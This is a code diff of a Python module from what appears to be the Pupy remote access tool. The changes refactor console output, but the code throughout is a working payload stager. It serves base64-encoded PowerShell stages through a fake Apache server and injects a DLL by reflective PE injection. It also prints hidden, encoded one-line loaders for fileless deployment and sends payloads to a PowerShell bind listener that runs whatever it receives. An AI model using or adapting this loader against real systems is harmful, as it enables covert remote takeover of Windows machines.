@@ -2,8 +2,10 @@
 # -*- coding: utf-8 -*-
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from SocketServer import ThreadingMixIn
+
 from pupylib.PupyCredentials import Credentials
-from pupylib.utils.term import colorize
+from pupylib.PupyOutput import List, Success, Warn
+
 from base64 import b64encode
 from ssl import wrap_socket
 import tempfile
@@ -23,6 +25,12 @@ APACHE_DEFAULT_404 = """<html><body><h1>It works!</h1>
 </body></html>"""
 
 class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
+    display = None
+
+    def __init__(self, display, *args, **kwargs):
+        self.display = display
+        super(PupyPayloadHTTPHandler, self).__init__(*args, **kwargs)
+
     def do_GET(self):
         self.server_version = "Apache/2.4.27 (Unix)"
         self.sys_version    = ""
@@ -35,7 +43,7 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
 
             # Send stage 1 to target
             self.wfile.write(self.server.stage1)
-            print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"
+            self.display(Success('[Stage 1/2] Powershell script served !'))
 
         elif self.path == "/%s" % url_random_two_x86 or self.path == "/%s" % url_random_two_x64:
             self.send_response(200)
@@ -44,16 +52,20 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
 
             stage2 = None
             if self.path == "/%s" % url_random_two_x86:
-                print colorize("[+] ","green") + "remote script is running in a x86 powershell process"
+                self.display(Success('Remote script is running in a x86 powershell process'))
                 stage2 = self.server.stage2_x86
             else:
-                print colorize("[+] ","green") + "remote script is running in a x64 powershell process"
+                self.display(Success('Remote script is running in a x64 powershell process'))
                 stage2 = self.server.stage2_x64
 
             # Send stage 2 to target
             self.wfile.write(stage2)
-            print colorize("[+] ","green") + "[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!"
-            print colorize("[+] ","green") + colorize("%s:You should have a pupy shell in few seconds from this host..." % self.client_address[0], "green")
+
+            self.display(Success(
+                '[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!'))
+            self.display(Success(
+                '{}:You should have a pupy shell in few seconds from this host...'.format(
+                    self.client_address[0])))
 
         else:
             self.send_response(404)
@@ -93,7 +105,7 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
             pass
         self.socket.close()
 
-def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTargetProxy=False, sslEnabled=True, nothidden=False):
+def serve_ps1_payload(display, conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTargetProxy=False, sslEnabled=True, nothidden=False):
     try:
 
         protocol             = 'http'
@@ -140,10 +152,11 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTar
         stage1 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage1))
 
         # generate both pupy dll to gain time response
-        print colorize("Generating puppy dll to gain server reaction time. Be patient...", "red")
+        display(Success('Generating puppy dll to gain server reaction time. Be patient...'))
+
         tmpfile    = tempfile.gettempdir()
-        output_x86 = pupygen.generate_ps1(self.log, conf, output_dir=tmpfile, x86=True)
-        output_x64 = pupygen.generate_ps1(self.log, conf, output_dir=tmpfile, x64=True)
+        output_x86 = pupygen.generate_ps1(display, conf, output_dir=tmpfile, x86=True)
+        output_x64 = pupygen.generate_ps1(display, conf, output_dir=tmpfile, x64=True)
 
         stage2_x86 = open(output_x86).read()
         stage2_x64 = open(output_x64).read()
@@ -152,32 +165,38 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTar
         stage2_x86 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x86))
         stage2_x64 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2_x64))
 
-        server = ThreadedHTTPServer((ip, port),PupyPayloadHTTPHandler)
+        server = ThreadedHTTPServer(
+            (ip, port),
+            lambda *args, **kwargs: PupyPayloadHTTPHandler(display, *args, **kwargs))
+
         server.set(conf, sslEnabled, stage1, stage2_x86, stage2_x64)
 
-        print colorize("[+] ","green")+"copy/paste one of these one-line loader to deploy pupy without writing on the disk :"
-        print " --- "
-        print colorize(oneliner, "green")
-        print " --- "
-        print colorize(encoded_oneliner, "green")
-        print " --- "
-        print colorize("Please note that even if the target's system uses a proxy, this previous powershell command will not use the proxy for downloading pupy", "yellow")
-        print " --- "
+        display(List([
+            oneliner,
+            encoded_oneliner
+        ], caption=Success(
+            'Copy/paste one of these one-line loader to deploy pupy without writing on the disk:')))
 
-        print colorize("[+] ","green") + 'Started http server on %s:%s ' % (ip, port)
-        print colorize("[+] ","green") + 'waiting for a connection ...'
+        display(Warn(
+            'Please note that even if the target\'s system uses a proxy, '
+            'this previous powershell command will not use the '
+            'proxy for downloading pupy'))
+
+        display(Success('Started http server on %s:%s ' % (ip, port)))
+        display(Success('Waiting for a connection ...'))
+
         server.serve_forever()
     except KeyboardInterrupt:
         print 'KeyboardInterrupt received, shutting down the web server'
         server.server_close()
 
+    finally:
         # clean local file created
         os.remove(output_x86)
         os.remove(output_x64)
 
-        exit()
+def send_ps1_payload(display, conf, bind_port, target_ip, nothidden=False):
 
-def send_ps1_payload(conf, bind_port, target_ip, nothidden=False):
     ps1_template = """$l=[System.Net.Sockets.TcpListener][BIND_PORT];$l.start();$c=$l.AcceptTcpClient();$t=$c.GetStream();
     [byte[]]$b=0..4096|%{0};$t.Read($b, 0, 4);$c="";
     if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64'){$t.Write([System.Text.Encoding]::UTF8.GetBytes("2"),0,1);}
@@ -185,6 +204,7 @@ def send_ps1_payload(conf, bind_port, target_ip, nothidden=False):
     while(($i=$t.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$c=$c+$d; }
     $t.Close();$l.stop();iex $c;
     """
+
     main_ps1_template = """$c=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $c;"""
     hidden               = '' if nothidden else '-w hidden '
     launcher             = ps1_template.replace("[BIND_PORT]",bind_port)
@@ -192,33 +212,43 @@ def send_ps1_payload(conf, bind_port, target_ip, nothidden=False):
     basic_launcher       = "powershell.exe [HIDDEN]-noni -nop [CMD]".replace('[HIDDEN]', hidden)
     oneliner             = basic_launcher.replace('[CMD]', '-c \"%s\"' % launcher)
     encoded_oneliner     = basic_launcher.replace('[CMD]', '-enc %s' % b64encode(launcher.encode('UTF-16LE')))
-    print colorize("[+] ","green")+"copy/paste one of these one-line loader to deploy pupy without writing on the disk :"
-    print " --- "
-    print colorize(oneliner, "green")
-    print " --- "
-    print colorize(encoded_oneliner, "green")
-    print " --- "
-    print colorize("Generating puppy dll. Be patient...", "red")
+
+    display(List([
+            oneliner,
+            encoded_oneliner,
+        ], caption=Success(
+            'Copy/paste one of these one-line loader to '
+            'deploy pupy without writing on the disk')))
+
+    display(Success('Generating puppy dll. Be patient...'))
+
     tmpfile    = tempfile.gettempdir()
-    output_x86 = pupygen.generate_ps1(self.log, conf, output_dir=tmpfile, x86=True)
-    output_x64 = pupygen.generate_ps1(self.log, conf, output_dir=tmpfile, x64=True)
+
+    output_x86 = pupygen.generate_ps1(display, conf, output_dir=tmpfile, x86=True)
+    output_x64 = pupygen.generate_ps1(display, conf, output_dir=tmpfile, x64=True)
+
     ps1_x86 = open(output_x86).read()
     ps1_x64 = open(output_x64).read()
-    raw_input("[?] Press <enter> if you are ready to connect (to remote target)")
-    print colorize("[+] ","green")+"Connecting to {0}:{1}".format(target_ip, bind_port)
+
+    display(Success('Connecting to {0}:{1}'.format(target_ip, bind_port)))
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target_ip, int(bind_port)))
     s.sendall("\n")
-    print colorize("[+] ","green")+"Receiving target architecure..."
+
+    display(Success('Receiving target architecure...'))
+
     version = s.recv(1024)
     ps1_encoded = None
     if version == '2':
-        print colorize("[+] ","green")+"Target architecture: x64"
+        display(Success('Target architecture: x64'))
         ps1_encoded = main_ps1_template.format(b64encode(ps1_x64))
     else:
-        print colorize("[+] ","green")+"Target architecture: x86"
+        display(Success('Target architecture: x86'))
         ps1_encoded = main_ps1_template.format(b64encode(ps1_x86))
-    print colorize("[+] ","green")+"Sending ps1 payload to {0}:{1}".format(target_ip, bind_port)
+
+    display(Success('Sending ps1 payload to {0}:{1}'.format(target_ip, bind_port)))
     s.sendall(ps1_encoded)
     s.close()
-    print colorize("[+] ","green")+"ps1 payload sent to target {0}:{1}".format(target_ip, bind_port)
+
+    display(Success('ps1 payload sent to target {0}:{1}'.format(target_ip, bind_port)))
